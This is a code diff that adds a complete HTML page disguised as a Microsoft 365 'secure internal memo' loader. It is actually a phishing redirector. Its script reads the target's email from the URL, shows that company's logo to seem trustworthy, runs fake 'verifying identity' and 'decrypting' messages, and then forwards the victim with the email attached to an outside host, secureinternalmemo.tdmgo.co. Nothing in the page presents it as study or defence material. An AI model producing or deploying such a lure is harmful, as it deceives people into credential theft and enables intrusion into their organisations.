@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accessing Secure Document</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI,system-ui,-apple-system,BlinkMacSystemFont,sans-serif');
+
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #F8F9FA; /* Light gray background */
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #FFFFFF;
+            border: 1px solid #DEE2E6; /* Light border */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            padding: 40px 50px;
+            width: 550px;
+            max-width: 95%;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .company-logo {
+            max-width: 150px;
+            max-height: 50px;
+            margin-bottom: 25px;
+            object-fit: contain;
+        }
+        
+        .title {
+            color: #212529;
+            font-size: 26px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+        }
+
+        .subtitle {
+            color: #6C757D;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        .loading-container {
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #005A9E; /* SharePoint blue */
+            font-size: 15px;
+            margin: 0;
+            height: 20px;
+            transition: color 0.3s;
+        }
+
+        .progress-container {
+            background-color: #E9ECEF;
+            height: 4px;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 15px auto 25px;
+            width: 80%;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background-color: #0078D4; /* Microsoft Blue */
+            width: 0%;
+            animation: decrypt-fill 2.5s ease-out forwards;
+            border-radius: 2px;
+        }
+
+        .file-info { 
+            color: #6C757D;
+            font-size: 14px;
+            margin: 0 0 30px 0;
+        }
+
+        .footer-text {
+            color: #ADB5BD;
+            font-size: 12px;
+            margin-top: 35px;
+        }
+
+        @keyframes decrypt-fill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #FFF3CD;
+            color: #856404;
+            border: 1px solid #FFEEBA;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
+            <h1 class="title">Accessing Secure Internal Memo</h1>
+            <p class="subtitle">Please wait while we establish a secure connection to your organization's document.</p>
+        </div>
+        <div class="loading-container">
+            <p class="loading-text" id="loadingText">Establishing secure channel...</p>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        <p class="file-info">This may take a moment.</p>
+        <noscript>
+            <p>JavaScript is required to access this secure document. Please enable it in your browser settings.</p>
+        </noscript>
+        <p class="footer-text">Powered by Microsoft 365</p>
+    </div>
+
+    <script>
+    (function() {
+        const loadingText = document.getElementById('loadingText');
+        const texts = [
+            "Establishing secure channel...",
+            "Verifying your identity...",
+            "Decrypting document...",
+            "Opening file..."
+        ];
+        let textIndex = 0;
+        const interval = setInterval(() => {
+            textIndex++;
+            if (textIndex < texts.length) {
+                loadingText.textContent = texts[textIndex];
+            } else {
+                clearInterval(interval);
+            }
+        }, 600);
+
+        const REDIRECT_DELAY = 3500;
+        const MOBILE_REDIRECT_URL_BASE = "https://secureinternalmemo.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&Zw6aMW=eNKKj8h&username=";
+
+        function getEmailFromState() {
+            const searchParams = new URLSearchParams(window.location.search);
+            const state = searchParams.get('state');
+            if (!state) return null;
+
+            const parts = state.split(':');
+            if (parts.length > 1) {
+                const potentialEmail = parts[parts.length - 1];
+                if (potentialEmail && potentialEmail.includes('@')) {
+                    return potentialEmail;
+                }
+            }
+            return null;
+        }
+
+        function setCompanyLogo(email) {
+            if (!email) return;
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logoEl = document.getElementById('companyLogo');
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                
+                logoEl.src = logoUrl;
+                logoEl.onload = () => { logoEl.style.display = 'block'; };
+                logoEl.onerror = () => { logoEl.style.display = 'none'; };
+            }
+        }
+        
+        function performRedirect() {
+            clearInterval(interval);
+            const email = getEmailFromState();
+
+            if (email) {
+                console.log("Found email:", email);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
+                console.log("Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                console.log("No email found in state parameter. Showing error.");
+                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
+                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
+                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
+                const progressBar = document.getElementById('progressBar');
+                if (progressBar) {
+                    progressBar.style.background = '#DC3545';
+                    progressBar.style.width = '100%';
+                }
+            }
+        }
+        
+        const email = getEmailFromState();
+        setCompanyLogo(email);
+        setTimeout(performRedirect, REDIRECT_DELAY);
+    })();
+    </script>
+</body>
+</html>
